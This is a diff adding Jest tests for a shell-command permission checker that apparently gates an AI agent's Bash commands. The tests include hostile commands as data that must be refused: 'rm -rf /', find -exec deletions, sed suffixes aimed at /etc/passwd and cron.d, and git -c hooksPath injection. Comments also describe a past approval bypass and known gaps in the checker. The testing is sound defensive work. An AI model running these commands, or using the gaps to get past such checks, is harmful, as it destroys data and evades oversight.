+        'sed -i --file=evil.sed f',
+        // This spelling DOES start with `sed -i `, so it reaches
+        // `writeGroupVeto`, where `--file=evil.sed` fails `hasUnsafeWriteFlag`
+        // ('file' is not in sed's `safeLongFlags`) and that check runs FIRST
+        // in the `||` chain -- genuinely the flag axis, not prefix mismatch.
+        '--file loads an ARBITRARY external script; this spelling reaches and is refused by the flag axis',
+      ],
+    ];
+    for (const [cmd, why] of mustBeNull) {
+      test(`${JSON.stringify(cmd)} — ${why}`, () => expect(bash(cmd, WRITE_GROUPS)).toBeNull());
+    }
+  });
+
+  describe('destination axis: still refused regardless of script shape', () => {
+    for (const target of ['.env', 'package.json']) {
+      test(`sed -i 's/a/b/' ${target}`, () =>
+        expect(bash(`sed -i 's/a/b/' ${target}`, WRITE_GROUPS)).toBeNull());
+    }
+  });
+
+  test('read-side SCOPED_VETO is untouched: sed -n with -i still refuses', () => {
+    // Matched via read-only's `sed -n` prefix, not fs-write's `sed -i` --
+    // `hasScopedVeto` (permission-groups.ts) refuses any sed segment
+    // carrying `-i`/`--in-place` regardless of which prefix it matched.
+    expect(bash("sed -n -i 's/a/b/' f", ALL)).toBeNull();
+  });
+
+  test('without fs-write requested, sed -i matches no prefix at all', () => {
+    expect(bash("sed -i 's/a/b/' f", ALL)).toBeNull();
+  });
+
+  test('the backup-suffix VALUE, reached through the FULL group path, is null via PREFIX MISMATCH', () => {
+    // #1061 review: relabeled -- this used to claim the destination-axis
+    // check on the suffix was what refused these. It is not, TODAY: an
+    // attached `-i'...'` (no space before the quote) does not start with the
+    // curated `sed -i ` prefix any more than `sed -i.bak` does (same
+    // `matchPrefix` residual), so `writeGroupVeto` -- and the suffix check
+    // inside `sedScriptShapeVeto` these commands were meant to exercise -- is
+    // never reached at all. Both commands really are null, just for a
+    // different reason than this test's own name used to say. See the
+    // "documented residual" block below for the general case, and the
+    // "backup-suffix VALUE, reached directly" block below for tests that
+    // actually reach and exercise the suffix check.
+    expect(bash("sed -i'*/tmp/../../etc/cron.d/evil' 's/a/b/' f", WRITE_GROUPS)).toBeNull();
+    expect(bash("sed -i'../../../etc/passwd' 's/a/b/' f", WRITE_GROUPS)).toBeNull();
+  });
+
+  describe('backup-suffix VALUE, reached directly: defense-in-depth for the ADR 0026 residual', () => {
+    // The two branches these tests exercise (permission-groups.ts,
+    // `sedScriptShapeVeto`'s `-i<suffix>` and `--in-place=<suffix>` checks)
+    // are UNREACHABLE through `matchGroups`/`bash()` today for the reason the
+    // test above and the "documented residual" block below both demonstrate:
+    // `matchPrefix` requires a literal space after `sed -i`, which neither
+    // attached spelling has. Calling the exported veto function directly
+    // (mirrors `MUTATION_TOKEN`'s "exported for tests ONLY" convention)
+    // bypasses that prefix-matching layer entirely, so these ARE genuine
+    // direct exercises of the suffix check, kept as defense-in-depth for the
+    // day attached-suffix prefix matching is added.
+    test("-i'<suffix>' containing a path separator and a glob is vetoed", () => {
+      expect(sedScriptShapeVeto("sed -i'*/tmp/../../etc/cron.d/evil' 's/a/b/' f")).toBe(true);
+    });
+    test('--in-place=<suffix> containing an ascent is vetoed', () => {
+      expect(sedScriptShapeVeto("sed --in-place=../../../etc/passwd 's/a/b/' f")).toBe(true);
+    });
+    test('an ordinary attached suffix (no separator or glob) is NOT vetoed by this check', () => {
+      expect(sedScriptShapeVeto("sed -i.bak 's/a/b/' f")).toBe(false);
+    });
+  });
+
+  test('#959 final pass invariant: sed -i -Zqx is refused by the flag axis', () => {
+    // Pinned directly here too (in addition to the machine-checked walk over
+    // BUILTIN_GROUPS above): an unclassified flag must be refused.
+    expect(bash('sed -i -Zqx target', WRITE_GROUPS)).toBeNull();
+  });
+
+  describe('#1061: the sed FLAG_POLICY, pinned on a VALID script (isolates the flag axis)', () => {
+    // `sed -i -Zqx target` (above, and in the machine-checked walk) bundles
+    // THREE unsafe letters against an INVALID script, so it does not isolate
+    // any one letter, and -- since `hasUnsafeWriteFlag` runs first in
+    // `writeGroupVeto`'s `||` chain and short-circuits -- it never even
+    // reaches `sedScriptShapeVeto` to find out the script was invalid too.
+    // These two use a SINGLE unsafe flag against an otherwise-valid `s///`
+    // script, which is the only shape that actually distinguishes "the flag
+    // axis caught this" from "the script-shape veto would have caught it
+    // anyway".
+    test("sed -i -Z 's/a/b/' f", () =>
+      expect(bash("sed -i -Z 's/a/b/' f", WRITE_GROUPS)).toBeNull());
+    test("sed -i -w 's/a/b/' f", () =>
+      expect(bash("sed -i -w 's/a/b/' f", WRITE_GROUPS)).toBeNull());
+  });
+
+  test("sed -i 's;a;b;g' f — ; used AS THE DELIMITER is refused conservatively", () => {
+    // The `;`-inclusion check's unique observable effect (see
+    // `sedScriptShapeOk`'s doc comment): this script otherwise has exactly 4
+    // fields and a valid trailing class ('g'), so it would PASS the
+    // field-count and trailing-class checks on their own. It is refused only
+    // because `;` is refused outright, regardless of role.
+    expect(bash("sed -i 's;a;b;g' f", WRITE_GROUPS)).toBeNull();
+  });
+
+  describe('documented residual: matchPrefix cannot see an ATTACHED -i suffix', () => {
+    // `matchPrefix` requires a literal space after the curated prefix
+    // (`segment.startsWith('sed -i ')`), which GNU's no-separator spelling
+    // never satisfies -- `sed -i.bak ...` does not start with `sed -i `, so
+    // it never reaches `sedScriptShapeVeto`, or any veto at all: it matches
+    // NO curated prefix and falls through, unconditionally safe (escalate),
+    // never unsafe. See the residuals comment above `sedScriptShapeVeto`.
+    test("sed -i.bak 's/a/b/' f — verified null, not covered", () => {
+      expect(bash("sed -i.bak 's/a/b/' f", WRITE_GROUPS)).toBeNull();
+    });
+  });
+});
+
+/**
  * #1001. `deny_groups` was answered by `matchGroups`, the same function that
  * answers the allow question. ADR 0010 says allow matching is PRECISE and deny
  * matching is BROAD; this was the one place a deny question was asked of a
@@ -1237,5 +1922,262 @@ describe('read-only utilities added after the live-session measurement', () => {
 
   test('the mutating Spotlight sibling is deliberately absent', () => {
     expect(bash('mdutil -E /')).toBeNull();
+  });
+});
+
+/**
+ * #1057 phase 3, commit 1: `matchComposedCommand` runs ONE `matchCoveredCommand`
+ * walk over the UNION of the user's own `allow` command-prefixes and the
+ * enabled groups' prefixes, so a compound chain whose segments are covered
+ * only by the union of the two -- neither `matchAllowPattern` nor `matchGroups`
+ * alone -- is approved instead of falling through to the LLM.
+ */
+describe('#1057 phase 3 commit 1: matchComposedCommand', () => {
+  describe('covered: union-only chains that neither single source covers alone', () => {
+    test('ssh <alias> (allow) piped into head (read-only group)', () => {
+      const cmd = 'ssh hallu nvidia-smi | head -2';
+      expect(matchComposedCommand(cmd, ['ssh hallu'], ['read-only'])).toEqual({
+        allowHit: 'ssh hallu',
+        groupHit: 'head',
+      });
+      // Pin the premise: neither single-source matcher can decide this alone.
+      expect(matchAllowPattern('Bash', { command: cmd }, ['ssh hallu'])).toBeNull();
+      expect(matchGroups('Bash', { command: cmd }, ['read-only'])).toBeNull();
+    });
+
+    test('uv run (allow) piped into tail (read-only group)', () => {
+      const cmd = 'uv run pytest | tail -5';
+      expect(matchComposedCommand(cmd, ['uv run'], ['read-only'])).toEqual({
+        allowHit: 'uv run',
+        groupHit: 'tail',
+      });
+      expect(matchAllowPattern('Bash', { command: cmd }, ['uv run'])).toBeNull();
+      expect(matchGroups('Bash', { command: cmd }, ['read-only'])).toBeNull();
+    });
+  });
+
+  describe('single-source chains: matchComposedCommand agrees, adds nothing new', () => {
+    test('allow-only chain: composed result names only the allow hit', () => {
+      const result = matchComposedCommand('git push origin main', ['git push'], ['read-only']);
+      expect(result).toEqual({ allowHit: 'git push', groupHit: null });
+    });
+
+    test('group-only chain: composed result names only the group hit', () => {
+      const result = matchComposedCommand('cat notes.txt', ['ssh hallu'], ['read-only']);
+      expect(result).toEqual({ allowHit: null, groupHit: 'cat' });
+    });
+  });
+
+  describe('exec-primitive still binds a matched segment, allow-owned or not', () => {
+    test('find -exec: an allow-owned "find" prefix does not spell out the primitive', () => {
+      // `matchCoveredCommand` applies its exec-primitive check to EVERY matched
+      // segment unconditionally, after the owner dispatch -- allow-owned matches
+      // are not exempt just because the allow path adds no group veto.
+      expect(
+        matchComposedCommand('find . -exec rm -rf {} + | head -1', ['find'], ['read-only']),
+      ).toBeNull();
+    });
+
+    test('--exec flag on an allow-owned "uv run" prefix', () => {
+      expect(
+        matchComposedCommand(
+          "uv run x --exec sh -c 'rm -rf /' | head -1",
+          ['uv run'],
+          ['read-only'],
+        ),
+      ).toBeNull();
+    });
+
+    test('spelling the primitive out in the allow entry itself still works', () => {
+      // Mirrors matchAllowPattern's own documented exception: an entry that
+      // spells the primitive out means the user saw and approved it.
+      expect(
+        matchComposedCommand(
+          'find . -exec echo {} \\; | head -1',
+          ['find . -exec echo'],
+          ['read-only'],
+        ),
+      ).toEqual({ allowHit: 'find . -exec echo', groupHit: 'head' });
+    });
+  });
+
+  test('a group-vetoed segment is NOT rescued by an allow prefix that does not cover it', () => {
+    // The bad-script `sed -i .../e` segment is refused by fs-write's own
+    // `sedScriptShapeVeto`; `allow` here covers an unrelated command ("ls"),
+    // so no owner of the "sed -i" prefix passes and the whole chain stays null.
+    expect(
+      matchComposedCommand("sed -i 's/x/y/e' f && head -1 f", ['ls'], ['fs-write', 'read-only']),
+    ).toBeNull();
+  });
+
+  test('a tool-name-shaped allow entry never leaks into command matching (looksLikeToolName filter)', () => {
+    // Without the filter, "WebFetch" would be treated as a literal Bash
+    // command-prefix and would match the segment below by pure text luck.
+    expect(
+      matchComposedCommand('WebFetch something | head -1', ['WebFetch'], ['read-only']),
+    ).toBeNull();
+  });
+
+  describe('degenerate inputs: composition degrades to single-source behavior', () => {
+    test('empty groups: covered iff matchAllowPattern alone covers it', () => {
+      const allow = ['git commit', 'git status'];
+      for (const cmd of ['git commit -m x', 'git status', 'rm -rf /', 'git push origin main']) {
+        const composed = matchComposedCommand(cmd, allow, []);
+        const direct = matchAllowPattern('Bash', { command: cmd }, allow);
+        expect(composed !== null).toBe(direct !== null);
+        if (composed !== null) expect(composed.allowHit).toBe(direct);
+      }
+    });
+
+    test('empty allow: covered iff matchGroups alone covers it', () => {
+      for (const cmd of ['cat notes.txt', 'git push origin main', 'head -5 f', 'rm -rf /']) {
+        const composed = matchComposedCommand(cmd, [], ['read-only']);
+        const direct = matchGroups('Bash', { command: cmd }, ['read-only']);
+        expect(composed !== null).toBe(direct !== null);
+      }
+    });
+
+    test('both empty: never covers anything', () => {
+      expect(matchComposedCommand('git status', [], [])).toBeNull();
+    });
+  });
+
+  describe('ADR 0026 pre-passes never run on this path at all (#1062 C5, CONFIRMED RCE-adjacent bypass)', () => {
+    test('no fs-write group: the redirect stays and hasShellControl refuses, even though allow covers python3', () => {
+      expect(
+        matchComposedCommand('python3 gen.py > out.txt', ['python3'], ['read-only']),
+      ).toBeNull();
+    });
+
+    // Was: {allowHit: 'python3', groupHit: null} -- APPROVED, before #1062. The
+    // `fs-write` redirect-grant pre-pass used to run over the WHOLE command
+    // before per-segment judgment, deleting `> out.txt` from an ALLOW-owned
+    // segment (`python3 gen.py`) that `matchAllowPattern` alone refuses outright
+    // (`hasShellControl` sees the live, non-`/dev/null` redirect). Proven by
+    // execution as a real bypass: `python3 evil.py > out.txt && ls` approved
+    // with `python3` allow-listed for read-only use and `fs-write` merely
+    // ENABLED (not even naming `python3`). `matchComposedCommand` no longer
+    // runs the pre-pass in this path at all -- see its function doc -- so an
+    // allow-owned segment now gets exactly `matchAllowPattern`'s raw treatment,
+    // and this composition (which needs the pre-pass AND the allow prefix
+    // together) fails closed instead of approving. `fs-write` alone, with no
+    // allow entry, still gets its redirect grant via `matchGroups` (the
+    // pure-group path) -- see `permission-groups.test.ts`'s fs-write section.
+    test('fs-write active: allow-owned segment still gets no redirect grant -- fails closed (#1062 C5)', () => {
+      expect(
+        matchComposedCommand('python3 gen.py > out.txt', ['python3'], ['read-only', 'fs-write']),
+      ).toBeNull();
+    });
+
+    test('heredoc excision does not run here either: allow-owned heredoc body is not made invisible', () => {
+      expect(
+        matchComposedCommand(
+          'ssh hallu bash <<EOF\nrm -rf /\nEOF\nls',
+          ['ssh hallu'],
+          ['read-only'],
+        ),
+      ).toBeNull();
+    });
+  });
+});
+
+// ---------------------------------------------------------------------------
+// #1057 phase 3, commit 4 (#962): `git -c` is a subcommand flag AFTER git's
+// subcommand and an exec primitive BEFORE it (or with no subcommand at all).
+//
+// None of the curated `vcs-read`/`vcs-write` prefixes below ever textually
+// START with `git -c ...` -- every curated entry is `git <subcommand>`, and
+// `-c` sitting between `git` and the subcommand means the text does not
+// begin with any of them. So a "must still refuse" case with `-c` BEFORE the
+// subcommand never even reaches `hasExecPrimitive` through `matchGroups`: it
+// is refused by ordinary prefix non-match, exactly as it always was, which
+// makes `bash()` non-diagnostic of THIS fix for that half. The positional
+// proof itself -- that `hasExecPrimitive` still says true for a pre-subcommand
+// `-c` and now says false for a post-subcommand one -- is pinned directly
+// against `hasExecPrimitive`, imported above (mirrors why `sedScriptShapeVeto`
+// is imported and called directly elsewhere in this file: some cases have no
+// other way to be reached).
+// ---------------------------------------------------------------------------
+
+describe('#962: git -c position-scoped exec veto', () => {
+  describe('matchGroups: a real curated prefix now sees past a post-subcommand -c', () => {
+    const cases: Array<[string, string]> = [
+      ['git switch -c newbranch', 'vcs-write:git switch'],
+      // Control: no `-c` at all, unaffected by this change either way.
+      ['git checkout -b nb', 'vcs-write:git checkout'],
+      ['git commit -c abc123 -m x', 'vcs-write:git commit'],
+      ['git commit --amend -c HEAD', 'vcs-write:git commit'],
+      // `git worktree add` has no `-c` of its own -- verified via
+      // `git worktree add -h` (only `-b`/`-B` create a branch; `--checkout`
+      // is long-only). This `-c` sits AFTER the top-level subcommand index
+      // (`worktree`), so the positional rule treats it as a subcommand-local
+      // flag and does not veto -- matching real git, whose global `-c`
+      // parser stops looking the moment it commits to a subcommand. Real git
+      // would reject the unrecognised option at parse time (harmless: no
+      // config-injection code path is ever reached), so this is a benign
+      // misapproval of invalid syntax, not a security regression.
+      ['git worktree add -c x', 'vcs-write:git worktree add'],
+    ];
+    for (const [cmd, expected] of cases) {
+      test(cmd, () => expect(bash(cmd, WRITE_GROUPS)).toBe(expected));
+    }
+  });
+
+  describe('matchGroups: pre-subcommand -c still refuses (via ordinary prefix non-match)', () => {
+    // See the section comment above: none of these reach `hasExecPrimitive`
+    // at all through `matchGroups`, because `-c` before the subcommand means
+    // the text does not start with any curated `git <subcommand>` prefix.
+    // Included for completeness against the shipped entry point; the
+    // `hasExecPrimitive` block below is what actually proves the position
+    // logic.
+    for (const cmd of [
+      'git -c core.hooksPath=/tmp/e commit -m x',
+      'git -c user.name=x status',
+      'git -c=k.v status',
+      'git --no-pager -c k=v log', // global flag then -c: still pre-subcommand
+    ]) {
+      test(JSON.stringify(cmd), () => expect(bash(cmd, [...ALL, ...WRITE_GROUPS])).toBeNull());
+    }
+  });
+
+  describe('hasExecPrimitive: direct, position-scoped (the actual proof)', () => {
+    const stillExecPrimitive: Array<[string, string]> = [
+      ['git -c core.hooksPath=/tmp/e commit -m x', 'standalone -c before the subcommand'],
+      ['git -c user.name=x status', 'standalone -c before the subcommand'],
+      ['git -c=k.v status', '=-attached -c before the subcommand'],
+      // A bundled short-option cluster containing `c`, positioned before the
+      // subcommand (`-p`/`--paginate` is a real global git flag; bundling it
+      // with `c` here is a synthetic worst case for the CLUSTER detector, not
+      // a claim about real git's own bundling support for `-c`'s mandatory
+      // value).
+      ['git -pc user.name=x status', 'c bundled into a cluster before the subcommand'],
+      ['git -c', 'trailing -c, end of string, no subcommand at all'],
+      ['git --no-pager -c k=v log', 'a recognised global flag does not reset the boundary'],
+      // A VALUE-consuming global flag before the -c: the scan must walk raw
+      // tokens up to the subcommand index (not jump by skipFlags' semantics),
+      // or `/path` would be mistaken for the subcommand and the -c read as
+      // post-subcommand. This is the one shape whose safety hinges on that.
+      [
+        'git -C /tmp -c core.hooksPath=/tmp/e status',
+        '-c after a value-consuming global flag, still pre-subcommand',
+      ],
+    ];
+    for (const [cmd, why] of stillExecPrimitive) {
+      test(`${JSON.stringify(cmd)} -- ${why}`, () => expect(hasExecPrimitive(cmd)).toBe(true));
+    }
+
+    const noLongerExecPrimitive: Array<[string, string]> = [
+      ['git switch -c newbranch', '-c after the subcommand'],
+      ['git checkout -b nb', 'control: no -c present at all'],
+      ['git commit -c abc123 -m x', '-c after the subcommand'],
+      ['git commit --amend -c HEAD', '-c after the subcommand, alongside --amend'],
+      [
+        'git worktree add -c x',
+        '-c after the subcommand (even though worktree add has no -c of its own)',
+      ],
+    ];
+    for (const [cmd, why] of noLongerExecPrimitive) {
+      test(`${JSON.stringify(cmd)} -- ${why}`, () => expect(hasExecPrimitive(cmd)).toBe(false));
+    }
   });
 });
